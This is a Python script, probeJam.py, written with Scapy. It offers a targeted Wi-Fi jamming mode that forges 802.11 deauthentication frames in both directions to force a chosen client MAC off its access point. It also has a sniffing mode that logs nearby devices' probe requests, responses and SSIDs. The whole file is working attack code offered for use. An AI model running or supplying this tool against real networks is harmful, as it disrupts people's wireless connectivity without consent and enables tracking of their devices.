#!/usr/bin/env python

# probeJam.py
# who? Steffen 'SteffnJ' Johansen
# when? 2016

# what? probeJam.py can be run in two modes:
# jamming (with the argument -j) or sniffing (without any arguments)
# The jamming is a targeted jam - so you don't have to jam all clients
# connected to an AP - like most jammers
# The sniffing part logs all probe requests and responses
# A logging option is also available

import logging #This and next line is to get scapy to shut up
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from signal import SIGINT, signal
from sys import exit
import re
import argparse

VERSION = "0.1"

# colors
W  = '\033[0m'  # white
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

# Create an argument parser
def argumentGenerator():
    # Create the parser object
    parser = argparse.ArgumentParser(description = "Jam and sniff"\
        + " some targets")

    # Providing the interface is not optional!
    parser.add_argument("interface",
                        type = str,
                        help = "target interface, in monitoring mode."\
                            + " Example: probeJam.py wlan0mon")

    # Verbose option
    parser.add_argument("-v",
                        "--verbose", action = "store_true",
                        help = "turn on verbosity")

    # Log file
    parser.add_argument("-l",
                        "--logfile",
                        type = str,
                        help = "log to LOGFILE. Example: -i log.txt")

    # Jam mode
    parser.add_argument("-j",
                        "--jam",
                        action = "store_true",
                        help = "jam user from accesspoint."\
                            + " Requires -t and -a.")

   
    # This is required if -j flag is set
    parser.add_argument("-t",
                        "--target",
                        help = "target's MAC address - needed for -j."\
                            + " Example: -a 66:75:63:6b:20:75")
   

    # This is required if -j flag is set
    parser.add_argument("-a",
                        "--accesspoint",
                        help = "access point of target -"\
                            + " needed for -j. Example: -a"\
                            + " 62:61:6c:6c:7a:7a")

    # Number of deauth - optional
    parser.add_argument("-c",
                        "--count",
                        type = int,
                        help = "number of deauth packets to send."\
                            + " Example: -c 100")

    # Other options?

    # Returns all the arguments
    return parser.parse_args()


# Do respective things based on arguments
def argumentTreat(args):
    # Set up interface (and other compulsory arguments)
    iface = args.interface

    if (args.verbose):
        printVerboseDetails()
    if (args.logfile):
        # Please be careful about the log file as you are
        # running this as root and may write over important
        # files/folders.
        global logFile
        logFile = args.logfile

    # Make sure it also has the additional target mac and ap mac
    if (args.jam):
        if (args.target and args.accesspoint):
            numPackets = 10
            if (args.count):
                numPackets = args.count
            target = args.target
            accesspoint = args.accesspoint
        else:
            print R+"Not supplied accesspoint/target MAC address"
            print "Exiting..."
            exit(0)

        # Error checking done - let's freakin' jam shit
        jam(iface, target, accesspoint, numPackets)

    else:
        # Just sniff shit
        probeSniff(iface)


# Basically just a start-up screen
def printVerboseDetails():
    print W + "probeJam.py"
    print "Version: %s" % VERSION
    print "Created by SteffnJ"
    print "Thanks for using probeJam."


# The jammer part
# iface, targetMac and apMac, and counter (numPackets) of deauth
def jam(iface, targetMac, apMac, numPackets):
    card = iface
    packets = [] # Empty array to store packets in

    # Print packet info
    print "Deauthenticating %s from %s" % (targetMac, apMac)
    print "Deauthenticating %s from %s" % (apMac, targetMac)

    deAuth1 = RadioTap()/Dot11(type = 0, subtype = 12,
        addr1 = targetMac.lower(),
        addr2 = apMac.lower(), 
        addr3 = apMac.lower())/Dot11Deauth(reason = 7)

    deAuth2 = RadioTap()/Dot11(type = 0, subtype = 12,
        addr1 = apMac.lower(),
        addr2 = targetMac.lower(), 
        addr3 = apMac.lower())/Dot11Deauth(reason = 7)

    packets.append(deAuth1)
    packets.append(deAuth2)

    for packet in packets:
        # use sendp to send packets over correct interface
        sendp(packet, iface = card, inter = 0.2, count = numPackets)


# The sniffer part
def probeSniff(interface):
    global requests
    requests = []
    sniffed = sniff(iface = interface, prn = myFuckingsFilter)


# Ugly regex that can be cleaned up
def myFuckingsFilter(packet):
    if (packet.haslayer(Dot11ProbeReq)):
        tmpString = packet.summary()
        ssid = re.sub("^.*/ SSID='", "", tmpString)
        ssid = re.sub("' /.*", "", ssid)
        tmpString = re.sub("^.*Management 4L ", "", tmpString)
        tmpString = re.sub(" / Dot11ProbeReq.*", "", tmpString)
        tmpString = re.sub(" > [0-9A-Za-z]{2}.*",
            "", tmpString)
        packetString = "Probe request:\t"
        packetString += tmpString
        packetString += "\t\t\t\tSSID: "
        packetString += ssid
        if (requests.count(packetString) == 0):  
            requests.append(packetString)
            print C+packetString
        
    elif (packet.haslayer(Dot11ProbeResp)):
        tmpString = packet.summary()
        ssid = re.sub("^.*/ SSID='", "", tmpString)
        ssid = re.sub("' /.*", "", ssid)
        tmpString = re.sub("^.*Management 5L ", "", tmpString)
        tmpString = re.sub(" / Dot11ProbeResp.*", "", tmpString)
        packetString = "Probe response:\t"
        packetString += tmpString
        packetString += "\t\tSSID: "
        packetString += ssid
        if (requests.count(packetString) == 0):  
            requests.append(packetString)
            print O+packetString
        

# Write the log to a file when you kill the program
def kill(signal, frame):
    print "\n"
    if ('logFile' in globals()):
        print R+"\nWriting to file"
        f = open(logFile, "w")
        for line in requests:
            f.write(line + "\n")
        f.close()
    print R+"Exiting..."
    exit(1)


# Start main and treat the program flow based on args
def main():
    args = argumentGenerator()
    argumentTreat(args)


if (__name__ == "__main__"):
    # Make sure that we can kill the program
    signal(SIGINT, kill)
    # Run the main program
    main()